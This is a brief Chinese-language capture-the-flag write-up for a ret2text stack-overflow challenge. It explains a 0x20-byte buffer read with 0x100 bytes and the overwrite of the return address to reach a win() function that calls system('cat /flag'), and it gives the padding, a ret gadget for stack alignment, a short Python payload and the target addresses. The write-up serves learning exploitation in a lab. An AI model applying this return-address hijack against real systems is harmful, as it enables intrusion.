# WP：01-stack-overflow

## 题目信息

- 类型：ret2text
- 保护：NX、No PIE、No Canary
- 端口：13371

## 分析

`vuln()` 用 `read(0, buf, 0x100)` 读入 0x100 字节，但 `buf` 只有 0x20 字节，存在栈溢出。

程序中存在 `win()` 函数，调用 `system("cat /flag")`，直接劫持返回地址跳过去即可。

```
栈布局（vuln 栈帧）：
  buf      [0x20]
  saved rbp[0x08]
  ret addr [0x08]  <-- 覆盖这里
```

padding = 0x20 + 0x08 = 0x28 字节。

## 注意

`win()` 内部调用 `system()`，x86-64 ABI 要求调用前栈 16 字节对齐。直接跳 `win` 时栈差 8 字节，需要先垫一个 `ret` gadget。

## Exploit

```python
payload  = b'A' * 0x28
payload += p64(ret)   # 对齐
payload += p64(win)
```

## 关键地址

| 符号 | 地址 |
|------|------|
| win  | 0x401176 |
| ret gadget | 0x40101a |
